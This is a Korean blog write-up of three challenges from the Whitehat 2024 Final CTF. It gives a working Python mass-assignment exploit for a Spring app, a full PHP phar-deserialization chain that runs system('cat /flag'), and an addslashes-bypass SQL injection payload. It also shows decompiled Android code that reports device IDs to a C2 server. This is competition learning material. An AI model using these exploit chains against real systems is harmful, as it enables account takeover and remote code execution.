---
layout: post
title: Whitehat 2024 Final    
description: CTF Write-up
tags: Whitehat 2024 Final   
category: ctf 
---   
     
# Whitehat 2024 Final   

## 대회 일정
**2024-11-19 09:00 ~ 2024-11-19 18:00**   
     
## 대회 후기       
      
<img src="/assets/images/ctf/2024/whitehat-final/scoreboard.png" width=700px>
            
Whitehat 2024 Final 병사부문 7위로 마무리했다. 우리팀은 웹 1문제, 암호학 1문제, 리버싱 1문제를 풀었다.      
    
<img src="/assets/images/ctf/2024/whitehat-final/first-blood.jpg" width=700px>       
           
대회를 시작하고 병사부문에서 웹 퍼블을 따서 시작이 괜찮았다. 예선 때는 웹 3문제를 전부 풀었기에 이번에도 해볼만하다고 생각했었다. 하지만, 남은 2문제 모두 접근 방법은 맞았지만 해결하지 못한 채 대회를 마무리 하게 되었다.      
     
<!-- `cmsaudit` 문제를 봤을 때, php deserialization 취약점을 활용하여 RCE하는  -->

## Writeup     
     
- <a href="#getadminpage">getadminpage</a>     
- <a href="#cmsaudit">cmsaudit</a> 
- <a href="#ripapp">ripapp</a>      
         
<a id="getadminpage"></a>               
    
# getadminpage    
    
```java
@RequestMapping({"L0jU3lgokNLUQ7W1nppJ"})
@Controller
public class AdminController {
   @PutMapping({"/XXnNWBoD9DWidSaR0aVVFmD8sNeiLz"})
   public ResponseEntity<Map<String, ?>> admin(HttpServletRequest req) {
      HttpSession session = req.getSession(false);
      Map<String, Object> response = new HashMap();
      String content = "";
      if (session != null) {
         if (session.getAttribute("Role").equals("Admin")) {
            response.put("status", true);
            content = FileRead.fileread("/flag");
            response.put("FLAG", content);
            return ResponseEntity.ok(response);
         }

         response.put("status", false);
      }

      return ResponseEntity.ok(response);
   }
}
```  
admin 권한을 가진 계정으로 로그인하면 플래그를 얻을 수 있다.     
    
```java
@RequestMapping({"fsalke2j9sdfcjlz"})
@Controller
public class UserController {
   private final UserService userService;

   @Autowired
   public UserController(UserService userService) {
      this.userService = userService;
   }

   @PutMapping({"/MbyMx6EtyTm04EyJezkDTEPDipepro"})
   public ResponseEntity<Map<String, Boolean>> signup(@RequestBody UserEntity user) {
      boolean ret = this.userService.insertUser(user);
      Map<String, Boolean> response = new HashMap();
      if (!ret) {
         response.put("status", false);
      } else {
         response.put("status", true);
      }
        return ResponseEntity.ok(response);
   }
   ...
}
```
회원가입 부분을 봤는데 `UserEntity` 객체를 그대로 `.insertUser()` 메서드에 넣고 있는 것을 확인했다.    
     
```java
package com.vanni.getadminpage.user;

import com.vanni.getadminpage.user.dto.UserEntity;
import java.util.Optional;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.stereotype.Service;

@Service
public class UserService {
   private final UserRepository userRepository;

   @Autowired
   public UserService(UserRepository userRepository) {
      this.userRepository = userRepository;
   }

   public boolean insertUser(UserEntity user) {
      Optional<UserEntity> sql = this.userRepository.findByUsername(user.getUsername());
      if (!sql.isPresent()) {
         if (user.getUsername().length() > 13 && user.getPassword().length() > 13) {
            UserEntity data = this.userRepository.save(user);
            if (data != null) {
               return true;
            }
         }

         return false;
      } else {
         return false;
      }
   }
   ...
}
```     
데이터베이스 테이블에 기존 닉네임이 있는지 확인하고, 넘어온 객체를 저장하고 있다. 
즉, 유저의 입력 값에 의해 UserEntity 객체 속성 값을 지정할 수 있어 권한을 유저가 설정할 수 있는 취약점이 발생한다.    
    
### Exploit Code     
```python
import requests 

url = "http://3.36.69.112:10003"

ID = "helloworldname6"
PW = "helloworldpassword6"

s = requests.session() 
r = s.put( # signup
    f"{url}/fsalke2j9sdfcjlz/MbyMx6EtyTm04EyJezkDTEPDipepro", 
    json={
        "username": ID,
        "password": PW, 
        "userinfo": {
            "role": "Admin"
        }
    }
)

print(r.text) 

r = s.put( # login
    f"{url}/fsalke2j9sdfcjlz/sMo98RyFqT6aKOmcF2NqarIpmrz2ZV",
    json={
        "username": ID,
        "password": PW
    },
    allow_redirects=False
)
cookies = r.cookies.get_dict()
print(cookies) 

r = s.put( # access admin page
    f"{url}/L0jU3lgokNLUQ7W1nppJ/XXnNWBoD9DWidSaR0aVVFmD8sNeiLz",
    cookies=cookies
)
print(r.status_code) 
print(r.text)
```
    
### Flag    
whitehat2024{876d9f5f677b12a9694d244cb7482b607dd18437513f6a3f70e67f0c7c27a1ff0e95517cd221a326a8dd90ffed70bb309451}     
    
<a id="cmsaudit"></a>                   
    
# cmsaudit    
   
dbcon.php
```php
<?php
require_once 'dbconfig.php';

class DBCON{
    private $mysqli;
    public $func = '';
    public $args = '';
    /**
     * @param string $host     데이터베이스 호스트
     * @param string $dbname   데이터베이스 이름
     * @param string $username 사용자 이름
     * @param string $password 비밀번호
     */
    public function __construct( $dbname = null, $username = null,$host = null, $password = null){
        // .env 방식
        // $host = getenv('DB_HOST');
        if( $username && $dbname){
            $this->mysqli = new mysqli(DB_HOST, $username, DB_PASS, $dbname);
        }else{
            $this->mysqli = new mysqli(DB_HOST, DB_USER, DB_PASS,DB_NAME);
        }
        if ($this->mysqli->connect_error) {
            die("데이터베이스 연결 실패: " . $this->mysqli->connect_error);
        }
    }
    /**
     * 쿼리 실행
     * 
     * @param string $sql SQL 쿼리
     * @return mysqli_result|bool 쿼리 실행 결과
     */
    public function query($sql){
        $sql = trim($sql); 
        if (empty($sql)) {
            die("잘못된 쿼리");
        }
        $result = $this->mysqli->query($sql);
        if (!$result) {
            die("쿼리 실행 실패: " . $this->mysqli->error);
        }
        if($this->mysqli->insert_id){
            return $this->mysqli->insert_id;
        }
        return $result;
    }
    /**
     * SELECT 쿼리 실행 후 결과 반환
     * 
     * @param string $sql SQL 쿼리
     * @return array|null 쿼리 결과, 결과가 없으면 null
     */
    public function fetchOne($sql){
        $result = $this->query($sql);
        return $result->fetch_assoc(); // 결과를 연관 배열로 반환
    }
    /**
     * 결과에서 연관 배열로 모든 행 가져오기
     * 
     * @param string $sql SQL 쿼리
     * @return array 쿼리 결과
     */
    public function fetchAll($sql){
        $result = $this->query($sql);
        return $result->fetch_all(MYSQLI_ASSOC); // 연관 배열로 모든 결과 반환
    }
    /**
     * 데이터베이스 연결 종료
     */
    public function close(){
        $this->mysqli->close();
    }
    function __destruct() {
        if(!empty($this->func)){
            call_user_func($this->func, $this->args);
        }
    }
}
?>
```   
   
`DBCON` 클래스에 `__destruct()` 메서드에서 `call_user_func()` 함수를 호출한다. 역직렬화 취약점이 발생하면 `$this->func`,`$this->args` 값을 변조시켜 원하는 함수를 호출할 수 있어 RCE가 가능하다.     
     
users/profileapi.php     
```php 
<?php
require_once 'common.php';
$response='';
if (!isset($_SESSION['status']) || !$_SESSION['status']) {
    location("login.php");
    exit();
}
global $dbcon;
$user=$_SESSION['idx'];
$response='';
$row=selectUserIdx($dbcon,$user);
$dbcon->close();
if(!$row){
    $response = [
        'status' => false,
        'msg' => '데이터가 없습니다.'
    ];
}else{
    $imgpath=''; 
    # TARGET  phar:///var/www/html/uploads/0c079ce53f4531a9322af267e41c3689.jpg
    if(file_exists($row['filepath'])){ 
        $imgpath='/uploads/'.basename($row['filepath']);
    }else{
        $imgpath="/static/userimg.png";
    }
    $response=[
        'idx'=>$row['idx'],
        'role'=>$row['role'],
        'user'=>$row['user'],
        'filepath'=>$imgpath
    ];
}
resJson($response);
exit;
?>
```         
`phar://` 스키마를 사용할 수 있는 PHP 함수를 찾아보았고, `profileapi.php` 파일에서 `file_exists()` 함수를 호출하는 부분이 있어 역직렬화 취약점을 활용하는 문제임을 확신했다.    
   
역직렬화 취약점을 발생시키기 위해선 `users` 테이블에 `filepath` 값을 `phar://` 형태로 변경해야했다.      

util/filefunc.php     
```php
<?php
function filefunc(){
    $uploadOk = 1;
    $target_dir =$_SERVER['DOCUMENT_ROOT']."/uploads/";
    $file_name = basename($_FILES["file"]["name"]);

    if (strpos($file_name, '..') !== false) {
        $uploadOk = 0;
    }
    $target_file = $target_dir . $file_name;
    
    $imageFileType = strtolower(pathinfo($target_file, PATHINFO_EXTENSION));
    if(isset($_POST["submit"])) {
        $check = getimagesize($_FILES["file"]["tmp_name"]);
        if($check !== false) {
            $uploadOk = 1;
        } else {
            $uploadOk = 0;
        }
    }
    if ($_FILES["file"]["size"] > 5000000) {
        $uploadOk = 0;
    }
    $allowedFileTypes = ['jpg', 'jpeg', 'png', 'gif'];
    if (!in_array($imageFileType, $allowedFileTypes)) {
        $uploadOk = 0;
    }
    // if (mime_content_type($tmpFile) !== "image/gif" || $fileExtension !== "gif") {
    //     echo "Sorry, only JPG, JPEG, PNG, GIF files are allowed.";
    //     $uploadOK = 0;
    // }
    
    if ($uploadOk == 0) {
        // echo "Sorry, your file was not uploaded.";
        
    } else {
        $newFileName = $target_dir . bin2hex(random_bytes(16)) . '.' . $imageFileType;
        if (move_uploaded_file($_FILES["file"]["tmp_name"], $newFileName)) {
            // echo "The file ". htmlspecialchars( basename( $_FILES["file"]["name"])). " has been uploaded.";
        } else {
            // echo "Sorry, there was an error uploading your file.";
            
        }
    }
    return $newFileName;
}
?>
```
유저의 프로필 배경을 변경하는 `users/editapi.php` 코드에서 `filefunc()` 함수에서 반환한 파일 명을 `users` 테이블의 `filepath` 값으로 업데이트 시킨다. 위 `util/filefunc.php` 코드를 보면 알 수 있듯이 `users` 테이블의 `filepath` 값은 `$_SERVER['DOCUMENT_ROOT']."/uploads/"`로 고정되어있어 SQL Injection 취약점을 활용해 `filepath` 값을 변경해야한다.    
    
board/sql.php     
```php
<?php
$TPREFIX="board";
$LIST="list";
...
function selectBoardListOne($con,$bname){
    global $TPREFIX,$LIST;
    $sql="SELECT * FROM $TPREFIX$LIST WHERE bname='$bname'";
    return $con->fetchOne($sql);
}

function updateBoard($con,$bname,$owneridx,$idx,$title,$content){
    global $TPREFIX; # TARGET
    $sql = "UPDATE $TPREFIX$bname SET title='$title', content='$content' WHERE owner='$owneridx' AND idx='$idx'";
    return $con->query($sql);
}
...
?>
```
대회 당시에 `$bname` 값을 `,users` 형태로 변조하여 `users.filepath` 값을 변조하는 방법을 떠올렸으나 SQL Injection을 어떻게 발생시켜야할지 떠올리지 못했다. 

filter.php    
```php
<?php

if( is_array($_GET) ) {
    foreach($_GET as $k => $v) {
        if( is_array($_GET[$k]) ) {
            foreach($_GET[$k] as $k2 => $v2) {
                $_GET[$k][$k2] = addslashes($v2);
            }
        } else {
            $_GET[$k] = addslashes($v);
        }
    }
}
if( is_array($_POST) ) {
    foreach($_POST as $k => $v) {
        if( is_array($_POST[$k]) ) {
            foreach($_POST[$k] as $k2 => $v2) {
                $_POST[$k][$k2] = addslashes($v2);
            }
        } else {
            $_POST[$k] = addslashes($v);
        }
    }
}
if( is_array($_COOKIE) ) {
    foreach($_COOKIE as $k => $v) {
        if( is_array($_COOKIE[$k]) ) {
            foreach($_COOKIE[$k] as $k2 => $v2) {
                $_COOKIE[$k][$k2] = addslashes($v2);
            }
        } else {
            $_COOKIE[$k] = addslashes($v);
        }
    }
}

function xssfilter($data){ 
    if(empty($data)) 
        return $data; 
    if(is_array($data)){ 
        foreach($data as $key => $value){ 
            $data[$key] =xssfilter($value); 
        }
        return $data; 
    } 
    $data = str_replace(array('&amp;','&lt;','&gt;'), array('&amp;amp;','&amp;lt;','&amp;gt;'), $data); 
    $data = preg_replace('/(&#*\w+)[\x00-\x20]+;/', '$1;', $data); 
    $data = preg_replace('/(&#x*[0-9A-F]+);*/i', '$1;', $data); 
    if (function_exists("html_entity_decode")){
        $data = html_entity_decode($data); 
    }else{
        $trans_tbl = get_html_translation_table(HTML_ENTITIES);
        $trans_tbl = array_flip($trans_tbl);
        $data = strtr($data, $trans_tbl);
    }
    $data = preg_replace('#(<[^>]+?[\x00-\x20"\'])(?:on|xmlns)[^>]*+>#i', '$1>', $data);
    $data = preg_replace('#([a-z]*)[\x00-\x20]*=[\x00-\x20]*([`\'"]*)[\x00-\x20]*j[\x00-\x20]*a[\x00-\x20]*v[\x00-\x20]*a[\x00-\x20]*s[\x00-\x20]*c[\x00-\x20]*r[\x00-\x20]*i[\x00-\x20]*p[\x00-\x20]*t[\x00-\x20]*:#i', '$1=$2nojavascript...', $data); 
    $data = preg_replace('#([a-z]*)[\x00-\x20]*=([\'"]*)[\x00-\x20]*v[\x00-\x20]*b[\x00-\x20]*s[\x00-\x20]*c[\x00-\x20]*r[\x00-\x20]*i[\x00-\x20]*p[\x00-\x20]*t[\x00-\x20]*:#i', '$1=$2novbscript...', $data); 
    $data = preg_replace('#([a-z]*)[\x00-\x20]*=([\'"]*)[\x00-\x20]*-moz-binding[\x00-\x20]*:#', '$1=$2nomozbinding...', $data); 
    $data = preg_replace('#(<[^>]+?)style[\x00-\x20]*=[\x00-\x20]*[`\'"]*.*?expression[\x00-\x20]*\([^>]*+>#i', '$1>', $data); 
    $data = preg_replace('#(<[^>]+?)style[\x00-\x20]*=[\x00-\x20]*[`\'"]*.*?behaviour[\x00-\x20]*\([^>]*+>#i', '$1>', $data); 
    $data = preg_replace('#(<[^>]+?)style[\x00-\x20]*=[\x00-\x20]*[`\'"]*.*?s[\x00-\x20]*c[\x00-\x20]*r[\x00-\x20]*i[\x00-\x20]*p[\x00-\x20]*t[\x00-\x20]*:*[^>]*+>#i', '$1>', $data); 
    $data = preg_replace('#</*\w+:\w[^>]*+>#i', '', $data); 
    do{ 
        $old_data = $data; 
        $data = preg_replace('#</*(?:applet|b(?:ase|gsound|link)|embed|frame(?:set)?|i(?:frame|layer)|l(?:ayer|ink)|meta|object|s(?:cript|tyle)|title|xml)[^>]*+>#i', '', $data); 
    } 
    while ($old_data !== $data); 
    return $data; 
} 

function strandint($input){
    return preg_replace('/[^a-zA-Z0-9]/', '', $input);
}
function intandint($input) {
    return preg_replace('/[^0-9]/', '', $input);
}

if(isset($_POST['user'])){
    $_POST['user']=strandint($_POST['user']);
}
if(isset($_POST['pass'])){
    $_POST['pass']=strandint($_POST['pass']);
}
if(isset($_POST['idx'])){
    $_POST['idx']=intandint($_POST['idx']);
}
if(isset($_GET['user'])){
    $_GET['user']=strandint($_GET['user']);
}
if(isset($_GET['idx'])){
    $_GET['idx']=intandint($_GET['idx']);
}
if(isset($_GET['bname'])){
    $_GET['bname']=xssfilter($_GET['bname']);
}
if(isset($_POST['bname'])){
    $_POST['bname']=xssfilter($_POST['bname']);
}
if(isset($_POST['toname'])){
    $_POST['toname']=xssfilter($_POST['toname']);
}
if(isset($_GET['toname'])){
    $_GET['toname']=xssfilter($_GET['toname']);
}

?>
```    

`filter.php`에 모든 입력에 대해 `addslashes()`가 걸려있어 어떻게 이를 우회하는지 6-7시간 동안 고민하고 찾아봐도 나오지 않았다. 대회가 끝나고 write-up을 참고해보니, `xssfilter()`에 `html_entity_decode()` 함수를 통해 SQL Injection을 발생시켜 `users.filepath` 값을 변조시키는 것이었다.  
      
`&#092;\'` 값을 입력하여 `\\'`로 변경시켜 `SELECT * FROM $TPREFIX$LIST WHERE bname='\\'` 쿼리가 실행되어 `addslashes()` 함수를 통해 추가된 `\`를 문자로 인식하게 만들어 `'`가 단순 문자로 인식하지 않아 SQL Injection이 가능해진다.        
         
board/editapi.php     
```php
<?php 
require_once 'common.php'; 
if (!isset($_SESSION['status']) || !$_SESSION['status']) {
    location("login.php");
    exit();
}

global $dbcon ;
$owneridx=$_SESSION['idx'];
$role=$_SESSION['role'];
$idx=$_POST['idx'];
$bname=$_POST['bname'];
$toname=$_POST['toname'];

$orgtb=selectBoardListOne($dbcon,$bname);

if(empty($orgtb)){
    $res=[
        "status"=>false,
        "msg"=>"존재 하지 않는 게시판 입니다!"
    ];
    resJson($res);
    exit();
}

if($role<$orgtb['role']){
    $res=[
        "status"=>false,
        "msg"=>"게시물을 작성할 권한이 없습니다!!"
    ];
    resJson($res);
    exit();
}

$orgboard=selectBoardOne($dbcon,$orgtb['bname'],$idx);
$title=isset($_POST['title']) ? $_POST['title']: $orgboard['title'];
$content=isset($_POST['content']) ? $_POST['content']: $orgboard['content'];

$tb=$orgtb['bname'];
if(($orgtb['bname'] === $toname)){
    $row2=updateBoard($dbcon,$orgtb['bname'],$owneridx,$idx,$title,$content);
    $row2=$idx;
}else{
    $totb=selectBoardListOne($dbcon,$toname);
    $row2=insertBoard($dbcon,$totb['bname'],$title,$content,$owneridx);
    $row3=deleteBoard($dbcon,$orgtb['bname'],$owneridx,$idx);
    if($row2){ 
        $idx=$row2;
        $tb=$totb['bname'];
    }
}
if($row2){
    $res=["status"=>true,"idx"=>$idx,"bname"=>$tb];
}
$dbcon->close();
resJson($res);
exit();
?>
```        
`$orgtb['bname'] === $toname` 조건을 만족하는 경우, `updateBoard()` 함수를 호출한다. 앞서 언급했던 `$bname` 값을 `,users` 형태로 변조하기 위해선 `boardlist` 테이블을 변조해야하기에     
    
```sql
&#092;\' UNION SELECT &quot;&quot;,&quot;main,users#&quot;,&quot;&quot;,&quot;&quot;;#
```    
         
`$bname` 변수에 위 값을 주면, `filter.php`의 `xssfilter()` 함수에 의해 `\\' UNION SELECT "","main,users#","","";#`로 바뀌게 되며 `boardlist`의 `bname` 컬럼 값이 `main,users#`로 설정된다. 
   
```sql
UPDATE boardmain,users# SET title='
SET users.filepath=x WHERE users.user=x;#', content='$content' WHERE owner='$owneridx' AND idx='$idx'
```   
`bname` 값에 `#`을 넣음으로써 `SET title='`를 주석처리 하고, `$title`에 `\n`를 넣어 `SET users.filepath=x WHERE users.user=x;#`를 처리하도록 SQL을 조작해주면 `users` 테이블의 `filepath` 컬럼 값을 `phar:///var/www/html/uploads/xxxxxx.jpg`로 변조시킬 수 있어 역직렬화 취약점을 발생시킬 수 있게 된다.     
    
### Exploit Code    

SQL Injection 코드는 @ohk990102 님께서 올려주신 write-up을 참고하여 작성하였습니다.      

1. Create a phar file
```php
<?php
define('DB_HOST', '127.0.0.1');
define('DB_USER', 'cmsuser');
define('DB_PASS', 'longing47');
define('DB_NAME', 'cmsmaindb');

class DBCON{
    private $mysqli;
    public $func = '';
    public $args = '';
    /**
     * @param string $host     데이터베이스 호스트
     * @param string $dbname   데이터베이스 이름
     * @param string $username 사용자 이름
     * @param string $password 비밀번호
     */
    public function __construct( $dbname = null, $username = null,$host = null, $password = null){
        // .env 방식
        // $host = getenv('DB_HOST');
        
        // COMMENT
        if( $username && $dbname){
            $this->mysqli = new mysqli(DB_HOST, $username, DB_PASS, $dbname);
        }else{
            $this->mysqli = new mysqli(DB_HOST, DB_USER, DB_PASS,DB_NAME);
        }
        if ($this->mysqli->connect_error) {
            die("데이터베이스 연결 실패: " . $this->mysqli->connect_error);
        }
    }
    /**
     * 쿼리 실행
     * 
     * @param string $sql SQL 쿼리
     * @return mysqli_result|bool 쿼리 실행 결과
     */
    public function query($sql){
        $sql = trim($sql); 
        if (empty($sql)) {
            die("잘못된 쿼리");
        }
        $result = $this->mysqli->query($sql);
        if (!$result) {
            die("쿼리 실행 실패: " . $this->mysqli->error);
        }
        if($this->mysqli->insert_id){
            return $this->mysqli->insert_id;
        }
        return $result;
    }
    /**
     * SELECT 쿼리 실행 후 결과 반환
     * 
     * @param string $sql SQL 쿼리
     * @return array|null 쿼리 결과, 결과가 없으면 null
     */
    public function fetchOne($sql){
        $result = $this->query($sql);
        return $result->fetch_assoc(); // 결과를 연관 배열로 반환
    }
    /**
     * 결과에서 연관 배열로 모든 행 가져오기
     * 
     * @param string $sql SQL 쿼리
     * @return array 쿼리 결과
     */
    public function fetchAll($sql){
        $result = $this->query($sql);
        return $result->fetch_all(MYSQLI_ASSOC); // 연관 배열로 모든 결과 반환
    }
    /**
     * 데이터베이스 연결 종료
     */
    public function close(){
        $this->mysqli->close();
    }
    function __destruct() {
        if(!empty($this->func)){
            call_user_func($this->func, $this->args);
        }
    }
}
@unlink("./payload.phar");

$phar = new Phar('./payload.phar');
$phar->startBuffering();
$phar->addFromString('test.txt', 'text');
$phar->setStub("\xff\xd8\xff<?php __HALT_COMPILER(); ?>");

$object = new DBCON(); 
$object->func = "system"; 
$object->args = "cat /flag";

$phar->setMetadata($object);
$phar->stopBuffering();
$object->close();

// file_exists("phar://./payload.jpg");
// php --define phar.readonly=0 payload.php 
?>
```    
    
2. Change the file extension from .phar to .jpg   

3. login & file upload & sql injection & php deserialization  

```python
import requests

url = 'http://52.79.217.37:10001'
ID = PW = 'helloworld1111'
# URL = 'http://localhost:10001'

def string_to_hex(input_string):
    hex_result = ''.join(format(ord(char), '02x') for char in input_string)
    return f'0x{hex_result}'

s = requests.Session() 

r = s.post(
    f"{url}/users/registerapi.php", 
    data={
        "user": ID, 
        "pass": PW
    }
)
assert r.status_code == 200

r = s.post(
    f"{url}/users/loginapi.php", 
    data={
        "user": ID, 
        "pass": PW  
    }
)
assert r.status_code == 200

r = s.post(
    f'{url}/users/editapi.php', 
    data={
        'user': ID,
        'pass': PW
    }, 
    files={
        'file': ('file.jpg', open('payload.jpg', 'rb'), 'image/jpg')
    }
)
assert r.status_code == 200

r = s.post(
    f"{url}/users/loginapi.php", 
    data={
        "user": ID, 
        "pass": PW  
    }
)
assert r.status_code == 200

r = s.post(f"{url}/users/profileapi.php")
assert r.status_code == 200

filepath = f'/var/www/html{r.json()["filepath"]}'

r = s.post(
    f'{url}/board/createapi.php', 
    data={
        'title': 'asd',
        'content': 'asd',
        'bname': 'main'
    }
)
assert r.status_code == 200

index = r.json()['idx']

payload = f'phar://{filepath}'

r = s.post(
    f'{url}/board/editapi.php', 
    data={
        'idx': index,
        'bname': '&#092;\' UNION SELECT &quot;&quot;,&quot;main,users#&quot;,&quot;&quot;,&quot;&quot;;#',
        'toname': 'main,users#',
        'title': f'\n SET users.filepath={string_to_hex(payload)} WHERE users.user={string_to_hex(ID)}#',
    }
)
print(r.text)

r = s.post(f'{url}/users/profileapi.php')
print(r.text)
```           
     
### Flag    
whitehat2024{6aaff0726bc7fbf8e1becf82f00138ea445b211c12b7dbc7afd53a199c0b70910ab59e0374f82a344f6832ab2cfd5f5fcca7}       
       
<a id="ripapp"></a>                   
    
# ripapp    
      
MainActivity.java      
```java 
package com.example.ripapp2;

import android.os.Bundle;
import android.provider.Settings;
import android.view.View;
import android.widget.Button;
import android.widget.Toast;
import androidx.activity.EdgeToEdge;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.NotificationCompat;
import androidx.core.graphics.Insets;
import androidx.core.view.ViewCompat;
import androidx.core.view.WindowInsetsCompat;
import org.json.JSONException;

public class MainActivity extends AppCompatActivity {
    private Button startBtn;

    public native void SayHelloWorld();

    /* access modifiers changed from: protected */
    public void onCreate(Bundle bundle) {
        super.onCreate(bundle);
        new check().isIntegrityValid(this, "test");
        MyApp myApp = (MyApp) getApplicationContext();
        myApp.setStartmsg("앱 시작");
        Toast.makeText(getApplicationContext(), myApp.getStartmsg(), 0).show();
        EdgeToEdge.enable(this);
        try {
            if (!SendData.send("/fsalke2j9sdfcjlz/BSBoQXNxCxOtACCpujH9zMdrCJsl5B").getBoolean(NotificationCompat.CATEGORY_STATUS)) {
                System.out.println("Failed to connect to C2 Server");
                finish();
            } else {
                ConfigC2.setUrllist(SendData.send("/fsalke2j9sdfcjlz/lh1sy5VXzAL8Qmadn5OOvLP5mheIo5").getJSONArray("list"));
                ConfigC2.setBody(SendData.send((Integer) 0).getJSONArray("list"));
                System.out.println("Connected to C2 Server successfully");
            }
        } catch (JSONException e) {
            System.out.println("json error");
            System.out.println(e.getMessage());
        } catch (Exception e2) {
            System.out.println("error");
            System.out.println(e2.getMessage());
        }
        setContentView(R.layout.activity_main);
        Button button = (Button) findViewById(R.id.startBtn);
        this.startBtn = button;
        button.setOnClickListener(new View.OnClickListener() {
            public void onClick(View view) {
                Toast.makeText(MainActivity.this.getApplicationContext(), "정확한 위치를 확인 하기 위해 사용자 동의가 필요 합니다!", 0).show();
                try {
                    SendData.send((Integer) 1, MainActivity.this.getDeviceInfo());
                } catch (Exception e) {
                    throw new RuntimeException(e);
                }
            }
        });
        ViewCompat.setOnApplyWindowInsetsListener(findViewById(R.id.main), new MainActivity$$ExternalSyntheticLambda0());
    }

    static /* synthetic */ WindowInsetsCompat lambda$onCreate$0(View view, WindowInsetsCompat windowInsetsCompat) {
        Insets insets = windowInsetsCompat.getInsets(WindowInsetsCompat.Type.systemBars());
        view.setPadding(insets.left, insets.top, insets.right, insets.bottom);
        return windowInsetsCompat;
    }

    /* access modifiers changed from: private */
    public String getDeviceInfo() {
        return Settings.Secure.getString(getContentResolver(), "android_id");
    }

    public void accessJob() {
        Toast.makeText(getApplicationContext(), "너의 정보의 명복을 엑셔언비이임~~~ 감사합니다!! ^^>", 0).show();
    }
}
```      